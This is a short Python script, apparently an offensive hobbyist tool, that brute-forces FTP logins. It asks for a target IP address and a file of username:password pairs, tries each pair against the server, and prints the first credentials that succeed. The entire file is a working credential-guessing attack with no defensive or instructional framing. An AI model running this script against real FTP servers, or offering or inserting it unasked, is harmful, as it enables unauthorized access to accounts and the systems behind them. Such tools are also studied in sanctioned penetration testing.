#!usr/bin/python

import ftplib

def bruteLogin(hostname, passwdFile):
	try:
		pF = open(passwdFile, "r")
	except:
		print ("[!!] File Does not Exist :(")
	for line in pF.readlines():
		username = line.split(':')[0]
		password = line.split(':')[1].strip('\n')
		print ("[*] Trying: " + username + "/" + password)
		try:
			ftp = ftplib.FTP(hostname)
			login = ftp.login(username,password)
			print ("[+] Login Succeeded with: " + username + "/" + password)
			ftp.quit()
			return(username,password)
		except:
			pass
	print ("[-] Password Not in list")

host = input("[*] Enter Target IP Address: ")
passwdFile = input("[*] Enter User/Password File Path: ")

bruteLogin(host, passwdFile)
